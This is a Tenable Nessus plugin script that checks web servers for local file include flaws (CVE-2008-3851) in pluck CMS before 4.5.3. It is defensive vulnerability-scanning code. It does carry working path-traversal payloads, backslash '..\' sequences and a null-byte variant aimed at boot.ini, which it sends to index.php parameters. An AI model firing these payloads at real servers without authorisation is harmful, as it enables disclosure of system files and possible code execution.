#
# (C) Tenable Network Security, Inc.
#



include("compat.inc");

if (description)
{
  script_id(34169);
  script_version("$Revision: 1.4 $");

  script_cve_id("CVE-2008-3851");
  script_bugtraq_id(30820);
  script_xref(name:"milw0rm", value:"6300");
  script_xref(name:"OSVDB", value:"47874");
  script_xref(name:"OSVDB", value:"47778");
  script_xref(name:"Secunia", value:"31607");

  script_name(english:"pluck < 4.5.3 Multiple Local File Include Vulnerabilities");
  script_summary(english:"Tries to read a local file");

 script_set_attribute(attribute:"synopsis", value:
"The remote web server contains a PHP application that is affected by
several local file include vulnerabilities." );
 script_set_attribute(attribute:"description", value:
"The remote host is running pluck, a simple content management system
written in PHP. 

The version of pluck installed on the remote host fails to sanitize
user-supplied input to several parameters before using it in
'data/inc/themes/predefined_variables.php' or
'data/inc/blog_include_react.php' to include PHP code.  An
unauthenticated remote attacker can exploit this issue to view
arbitrary files or possibly to execute arbitrary PHP code on the
remote host, subject to the privileges of the web server user id. 

Note that exploitation of these issues will only be successful if the
underlying operating system accepts a backslash as a path separator,
such as Windows." );
 script_set_attribute(attribute:"see_also", value:"http://www.securityfocus.com/archive/1/495706/30/0/threaded" );
 script_set_attribute(attribute:"see_also", value:"http://www.pluck-cms.org/releasenotes.php#4.5.3" );
 script_set_attribute(attribute:"solution", value:
"Upgrade to pluck 4.5.3." );
 script_set_attribute(attribute:"cvss_vector", value: "CVSS2#AV:N/AC:M/Au:N/C:P/I:P/A:P" );
script_end_attributes();


  script_category(ACT_ATTACK);
  script_family(english:"CGI abuses");

  script_copyright(english:"This script is Copyright (C) 2008-2009 Tenable Network Security, Inc.");

  script_dependencies("http_version.nasl", "os_fingerprint.nasl");
  script_exclude_keys("Settings/disable_cgi_scanning");
  script_require_ports("Services/www", 80);

  exit(0);
}


include("global_settings.inc");
include("misc_func.inc");
include("http.inc");


# Unless we're paranoid, don't bother if we know the OS and it's not 
# one that support backslashes as a path separator.
if (report_paranoia < 2)
{
  os = get_kb_item("Host/OS");
  if (
    os &&
    "Windows" >!< os && "Netware" >!< os && "OS/2" >!< os
  ) exit(0);
}


port = get_http_port(default:80);
if (!can_host_php(port:port)) exit(0);

file = crap(data:"..\", length:10*3) + "boot.ini";
file_pat = "^ *\[boot loader\]";


if (thorough_tests) 
{
  exploits = make_list(
    string("index.php?file=", file),
    string("index.php?blogpost=", file),
    string("index.php?blogpost=", SCRIPT_NAME, "&cat=", file, "%00")
  );
}
else 
{
  exploits = make_list(
    string("index.php?file=", file)
  );
}


# Loop through directories.
if (thorough_tests) dirs = list_uniq(make_list("/pluck", "/cms", cgi_dirs()));
else dirs = make_list(cgi_dirs());

foreach dir (dirs)
{
  foreach exploit (exploits)
  {
    url = string(dir, "/", exploit);

    r = http_send_recv3(method:"GET", item:url, port:port);
    if (isnull(r)) exit(0);
    res = r[2];

    # There's a problem if...
    file2 = str_replace(find:"\", replace:"\\", string:file);
    if (
      # it's pluck and...
      (
        'powered by <a href="http://www.pluck-cms.org">pluck' >< res ||
        egrep(pattern:'<a href="\\?file=kop[0-9]+\\.php">', string:res)
      ) &&
      (
        # we get the file we're looking for or...
        egrep(pattern:file_pat, string:res) ||
        # we get an error because magic_quotes was enabled or...
        string(file2, "\\0/posts/", SCRIPT_NAME) >< res ||
        # we get an error claiming the file doesn't exist or...
        string("main(data/blog//posts/", file2, "): failed to open stream: No such file") >< res ||
        string("include(data/blog//posts/", file2, ") [function.include]: failed to open stream: No such file") >< res ||
        string("include(data/blog//posts/", file2, ") [<a href='function.include'>function.include</a>]: failed to open stream: No such file") >< res ||
        # we get an error about open_basedir restriction.
        string("include(data/blog//posts/", file2, ") [function.include]: failed to open stream: Operation not permitted") >< res ||
        string("include(data/blog//posts/", file2, ") [<a href='function.include'>function.include</a>]: failed to open stream: Operation not permitted") >< res ||
        string("open_basedir restriction in effect. File(", file2) >< res
      )
    )
    {
      if (report_verbosity && egrep(pattern:file_pat, string:res))
      {
        output = "";
        if ("<!DOCTYPE" >< res) output = res - strstr(res, "<!DOCTYPE");
        if (!egrep(pattern:file_pat, string:output)) output = res;

        report = string(
          "\n",
          "Nessus was able to retrieve the contents of '\", str_replace(find:"..\", replace:"", string:file), "' on the\n",
          "remote host using the following URL :\n",
          "\n",
          "  ", build_url(port:port, qs:url), "\n"
        );
        if (report_verbosity > 1)
        {
          report = string(
            report,
            "\n",
            "Here are the contents :\n",
            "\n",
            "  ", str_replace(find:'\n', replace:'\n  ', string:output), "\n"
          );
        }
        security_warning(port:port, extra:report);
      }
      else security_warning(port);
      exit(0);
    }
  }
}
